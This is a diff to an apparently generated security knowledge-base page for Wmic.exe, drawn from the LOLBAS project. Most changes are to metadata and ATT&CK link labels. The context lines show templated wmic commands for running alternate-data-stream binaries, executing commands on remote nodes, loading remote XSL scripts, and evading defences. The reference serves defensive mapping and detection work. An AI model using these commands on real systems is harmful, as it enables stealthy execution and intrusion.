@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSBinaries/Wmic.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSBinaries"
 aliases:
   - "Wmic.exe"
@@ -23,16 +23,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Wmic.exe
-
 The WMI command-line (WMIC) utility provides a command-line interface for WMI
-
-## Metadata
-
-- Category: OSBinaries
-- Created: 2018-05-25
-- Author: Oddvar Moe
-- Source Path: yml/OSBinaries/Wmic.yml
 
 ## Paths
 
@@ -52,7 +43,7 @@ wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
 - Use Case: Execute binary file hidden in Alternate data streams to evade defensive counter measures
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts|T1564.004]]
+- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts#^t1564004-ntfs-file-attributes|T1564.004: NTFS File Attributes]]
 
 ### 2. Execute
 
@@ -65,7 +56,7 @@ wmic.exe process call create "{CMD}"
 - Use Case: Execute binary from wmic to evade defensive counter measures
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]
 
 ### 3. Execute
 
@@ -78,7 +69,7 @@ wmic.exe /node:"192.168.0.1" process call create "{CMD}"
 - Use Case: Execute binary on a remote system
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]
 
 ### 4. Execute
 
@@ -91,7 +82,7 @@ wmic.exe process get brief /format:"{REMOTEURL:.xsl}"
 - Use Case: Execute binary on remote system
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]
 
 ### 5. Execute
 
@@ -104,7 +95,7 @@ wmic.exe process get brief /format:"{PATH_SMB:.xsl}"
 - Use Case: Execute script from remote system
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]
 
 ### 6. Copy
 
@@ -117,7 +108,7 @@ wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\
 - Use Case: Copy file.
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]
+- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]
 
 ## Detections
 
